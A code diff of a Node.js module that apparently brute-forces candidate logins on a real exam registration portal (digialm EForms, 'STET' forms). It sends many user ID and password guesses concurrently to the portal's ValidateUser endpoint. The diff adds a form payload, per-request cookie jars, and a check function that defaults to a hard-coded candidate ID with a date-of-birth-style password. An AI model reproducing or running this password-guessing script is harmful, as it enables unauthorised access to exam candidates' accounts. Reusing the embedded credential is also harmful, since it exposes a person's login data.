@@ -16,11 +16,42 @@ const {
   updateIdStatus,
 } = require("./request.service");
 
-const baseUrl = "https://cdn3.digialm.com/EForms/";
+// const baseUrl = "https://cdn3.digialm.com/EForms/";
+const baseUrl = "https://g21.digialm.com//EForms/";
 const comData = "formId=66709&orgId=1631";
 const comDataObj = {
   formId: "66709",
   orgId: "1631",
+};
+
+const resFormData = {
+  userid: "",
+  confData: "",
+  useridForgotPwd: "",
+  loginHtmlPath: "/html/form66709/login.html",
+  orgId: 1631,
+  formId: 66709,
+  userID: "",
+  isPwdGenerationReq: "N",
+  withdrawalFormId: "",
+  redirectFormId: "",
+  hash: "",
+  mobileGetPwd: "",
+  changePwd_success: "",
+  copyrightYear: 2021,
+  data_deletion: "N",
+  consent_required: "N",
+  consent_agreed: "",
+  isFormMultilingualRequired: "N",
+  multilingualLanguageSelected: "Hindi",
+  loginHtmlPath: "/html/form66709/login.html",
+  orgId: 1631,
+  formId: 66709,
+  isPwdGenerationReq: "N",
+  loginHtmlPath: "/html/form66709/login.html",
+  orgId: "1631",
+  formId: "66709",
+  isPwdGenerationReq: "N",
 };
 
 let count = 0;
@@ -152,6 +183,7 @@ const handleError = async () =>
 const apiCall = async (data) =>
   new Promise(async (resolve, reject) => {
     try {
+      cookieJar = await request.jar();
       const { userid, password } = data;
       console.log(userid, password);
       const hitUrl = "loginAction.do?subAction=ValidateUser";
@@ -159,10 +191,11 @@ const apiCall = async (data) =>
       updateLocalWorkingInfo("apicall");
       request.post(
         {
-          headers: { "content-type": "application/x-www-form-urlencoded" },
+          // headers: { "content-type": "application/x-www-form-urlencoded" },
           url: url,
-          body: "",
+          // body: "",
           jar: cookieJar,
+          formData: resFormData,
         },
         async (error, response, body) => {
           try {
@@ -299,7 +332,6 @@ const startApiHit = (userid, data) =>
         newData.push({ userid: userid, password: data[i] });
       }
       // Promise.all(promises).
-      cookieJar = request.jar();
       console.log("startApiHit ====>");
       Promise.map(newData, apiCall, { concurrency: speed.concurrency })
         .then(async (results) => {
@@ -737,6 +769,41 @@ const stetUpdateWorkingInfo = async () =>
     }
   });
 
+const stetCheckApi = async (
+  data = { userid: "STET149529", password: "02061987" }
+) =>
+  new Promise(async (resolve, reject) => {
+    try {
+      cookieJar = await request.jar();
+      const { userid, password } = data;
+      console.log(userid, password);
+      const hitUrl = "loginAction.do?subAction=ValidateUser";
+      const url = `${baseUrl}${hitUrl}&${comData}&userid=${userid}&confData=${password}`;
+      request.post(
+        {
+          // headers: { "content-type": "application/x-www-form-urlencoded" },
+          url: url,
+          body: "",
+          jar: cookieJar,
+          formData: { ...resFormData, userid, password },
+        },
+        async (error, response, body) => {
+          if (error) {
+            resolve(error); // calling `reject` will cause the promise to fail with or without the error passed as an argument
+            console.error(`Error while apiCall error - ${error}`);
+            return; // and we don't want to go any further
+          } else {
+            console.log(response.statusCode);
+            resolve(response);
+          }
+        }
+      );
+    } catch (e) {
+      console.error(e);
+      reject(e);
+    }
+  });
+
 module.exports = {
   stetStart,
   stetStartProgram,
@@ -744,4 +811,5 @@ module.exports = {
   stetStatus,
   stetPreStart,
   stetUpdateWorkingInfo,
+  stetCheckApi,
 };
